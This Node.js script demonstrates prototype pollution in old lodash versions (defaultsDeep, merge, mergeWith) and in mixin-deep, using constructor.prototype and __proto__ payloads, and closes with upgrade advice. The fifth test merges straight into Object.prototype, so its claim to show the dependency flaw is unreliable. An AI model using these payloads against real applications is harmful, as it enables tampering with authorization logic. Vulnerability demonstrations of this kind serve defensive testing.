#!/usr/bin/env node

const _ = require('lodash');

console.log('🚨 Lodash Vulnerability Demonstration');
console.log('=====================================');
console.log(`Lodash version: ${require('lodash/package.json').version}`);
console.log();

// Function to test if prototype is polluted
function checkPrototypePollution() {
    const testObj = {};
    return {
        isAdmin: testObj.isAdmin,
        polluted: testObj.polluted,
        isHacked: testObj.isHacked,
        isVulnerable: testObj.isVulnerable,
        hasPollution: 'isAdmin' in testObj || 'polluted' in testObj || 'isHacked' in testObj || 'isVulnerable' in testObj
    };
}

function cleanPrototype() {
    if (Object.prototype.isAdmin !== undefined) delete Object.prototype.isAdmin;
    if (Object.prototype.polluted !== undefined) delete Object.prototype.polluted;
    if (Object.prototype.isHacked !== undefined) delete Object.prototype.isHacked;
    if (Object.prototype.isVulnerable !== undefined) delete Object.prototype.isVulnerable;
}

console.log('Initial state:');
console.log('Prototype pollution check:', checkPrototypePollution());
console.log();

// CVE-2019-10744: defaultsDeep vulnerability
console.log('1. Testing CVE-2019-10744 (defaultsDeep):');
console.log('Payload: {"constructor": {"prototype": {"isAdmin": true}}}');

const payload1 = {
    constructor: {
        prototype: {
            isAdmin: true
        }
    }
};

const defaults = {};
const result1 = _.defaultsDeep(defaults, payload1);

console.log('Result:', result1);
console.log('Prototype pollution check:', checkPrototypePollution());
if (checkPrototypePollution().hasPollution) {
    console.log('✅ Prototype successfully polluted via defaultsDeep!');
} else {
    console.log('❌ defaultsDeep pollution failed');
}
console.log();

// Clean up for next test
cleanPrototype();

// CVE-2018-3721: merge vulnerability  
console.log('2. Testing CVE-2018-3721 (merge):');
console.log('Payload: {"constructor": {"prototype": {"polluted": "via merge"}}}');

const payload2 = {
    constructor: {
        prototype: {
            polluted: 'via merge'
        }
    }
};

const target = {};
const result2 = _.merge(target, payload2);

console.log('Result:', result2);
console.log('Prototype pollution check:', checkPrototypePollution());
if (checkPrototypePollution().hasPollution) {
    console.log('✅ Prototype successfully polluted via merge!');
} else {
    console.log('❌ merge pollution failed');
}
console.log();

// Clean up for next test
cleanPrototype();

// CVE-2018-3721: mergeWith vulnerability
console.log('3. Testing CVE-2018-3721 (mergeWith):');
console.log('Payload: {"constructor": {"prototype": {"isHacked": "yes"}}}');

const payload3 = {
    constructor: {
        prototype: {
            isHacked: 'yes'
        }
    }
};

const target2 = {};
const result3 = _.mergeWith(target2, payload3, (objValue, srcValue) => {
    if (_.isArray(objValue)) {
        return objValue.concat(srcValue);
    }
});

console.log('Result:', result3);
console.log('Prototype pollution check:', checkPrototypePollution());
if (checkPrototypePollution().hasPollution) {
    console.log('✅ Prototype successfully polluted via mergeWith!');
} else {
    console.log('❌ mergeWith pollution failed');
}
console.log();

// Test a different payload that might work better for merge/mergeWith
console.log('4. Testing alternative payload for merge:');
console.log('Payload: {"__proto__": {"polluted": true}}');

cleanPrototype();

const payload4 = JSON.parse('{"__proto__": {"polluted": true}}');
const target3 = {};
const result4 = _.merge(target3, payload4);

console.log('Result:', result4);
console.log('Prototype pollution check:', checkPrototypePollution());
if (checkPrototypePollution().hasPollution) {
    console.log('✅ Prototype successfully polluted via merge with __proto__!');
} else {
    console.log('❌ merge with __proto__ pollution failed');
}
console.log();

// Clean up for next test
cleanPrototype();

// Transitive dependency vulnerability: mixin-deep via webpack dependency chain
console.log('5. Testing Transitive Dependency: mixin-deep vulnerability:');
console.log('Dependency chain: webpack -> micromatch -> snapdragon -> base -> mixin-deep@1.3.0');

// Access mixin-deep through the transitive dependency chain
const mixinDeep = require('mixin-deep');

console.log('mixin-deep version:', require('mixin-deep/package.json').version);
console.log('Payload: {"__proto__": {"isVulnerable": "mixin-deep"}}');

const payload5 = {
    __proto__: {
        isVulnerable: 'mixin-deep'
    }
};

// For mixin-deep to pollute the global prototype, we need to use Object.prototype as target
const result5 = mixinDeep(Object.prototype, payload5);

console.log('Result:', result5);
console.log('Prototype pollution check:', checkPrototypePollution());

// Check specifically for the mixin-deep pollution
const testObj5 = {};
if ('isVulnerable' in testObj5) {
    console.log('✅ Prototype successfully polluted via transitive mixin-deep dependency!');
    console.log('Value of testObj5.isVulnerable:', testObj5.isVulnerable);
} else {
    console.log('❌ mixin-deep pollution failed');
}
console.log();

console.log('🎯 Vulnerability demonstration complete!');
console.log('- defaultsDeep is clearly vulnerable in lodash 4.17.11');
console.log('- mixin-deep@1.3.0 is vulnerable via transitive dependency through webpack');
console.log('Upgrade to lodash 4.17.21+ and ensure mixin-deep 1.3.1+ to fix these vulnerabilities.');